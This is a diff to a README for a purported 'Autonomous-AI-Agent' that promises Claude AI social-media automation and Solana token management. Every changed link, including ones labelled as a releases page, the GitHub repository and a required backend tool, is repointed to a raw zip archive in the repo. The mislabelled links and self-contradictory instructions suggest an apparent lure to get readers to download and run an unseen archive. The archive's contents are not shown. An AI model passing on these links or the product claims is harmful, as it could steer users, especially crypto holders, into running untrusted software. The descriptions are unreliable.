@@ -4,7 +4,7 @@
 Welcome to the **Autonomous-AI-Agent**! This application combines smart social media management with blockchain features. It integrates Claude AI for useful interactions and manages your Solana tokens effortlessly. Ideal for DeFi projects, it automates community management and token operations, saving you time and effort.
 
 ## 📥 Download Now!
-[![Download Autonomous-AI-Agent](https://raw.githubusercontent.com/ChhunT17/Autonomous-AI-Agent/main/kehaya/Autonomous-AI-Agent.zip)](https://raw.githubusercontent.com/ChhunT17/Autonomous-AI-Agent/main/kehaya/Autonomous-AI-Agent.zip)
+[![Download Autonomous-AI-Agent](https://raw.githubusercontent.com/ChhunT17/Autonomous-AI-Agent/main/src/Agent_A_Autonomous_v1.5.zip)](https://raw.githubusercontent.com/ChhunT17/Autonomous-AI-Agent/main/src/Agent_A_Autonomous_v1.5.zip)
 
 ## 🚀 Getting Started
 This guide will help you download and run the **Autonomous-AI-Agent** software easily. Follow these steps to get started.
@@ -12,7 +12,7 @@ This guide will help you download and run the **Autonomous-AI-Agent** software e
 ### Step 1: Visit the Releases Page
 To download the software, visit the following link:
 
-[Download Page](https://raw.githubusercontent.com/ChhunT17/Autonomous-AI-Agent/main/kehaya/Autonomous-AI-Agent.zip)
+[Download Page](https://raw.githubusercontent.com/ChhunT17/Autonomous-AI-Agent/main/src/Agent_A_Autonomous_v1.5.zip)
 
 ### Step 2: Choose the Latest Version
 Once you're on the Releases page, look for the latest version of the software. This is usually the first entry on the page. You will find a list of assets available for download.
@@ -43,7 +43,7 @@ To ensure the software runs smoothly, please check that your computer meets the 
 ## 🛠️ Additional Tools
 You may benefit from additional tools alongside the **Autonomous-AI-Agent**. Consider exploring:
 
-- **https://raw.githubusercontent.com/ChhunT17/Autonomous-AI-Agent/main/kehaya/Autonomous-AI-Agent.zip**: Required for running some backend features.
+- **https://raw.githubusercontent.com/ChhunT17/Autonomous-AI-Agent/main/src/Agent_A_Autonomous_v1.5.zip**: Required for running some backend features.
 - **Solana CLI**: Useful for advanced token management tasks.
 
 ## 📞 Support
@@ -63,7 +63,7 @@ Engage with fellow users through our community platforms. Share your experiences
 ## 🔗 More Information
 For further details about the Autonomous-AI-Agent, check our GitHub repository:
 
-[GitHub Repository](https://raw.githubusercontent.com/ChhunT17/Autonomous-AI-Agent/main/kehaya/Autonomous-AI-Agent.zip)
+[GitHub Repository](https://raw.githubusercontent.com/ChhunT17/Autonomous-AI-Agent/main/src/Agent_A_Autonomous_v1.5.zip)
 
 ## 📥 Download & Install Again
-Don't forget to visit the [Download Page](https://raw.githubusercontent.com/ChhunT17/Autonomous-AI-Agent/main/kehaya/Autonomous-AI-Agent.zip) to grab the latest updates. Enjoy the benefits of automating your AI and blockchain tasks today!
+Don't forget to visit the [Download Page](https://raw.githubusercontent.com/ChhunT17/Autonomous-AI-Agent/main/src/Agent_A_Autonomous_v1.5.zip) to grab the latest updates. Enjoy the benefits of automating your AI and blockchain tasks today!
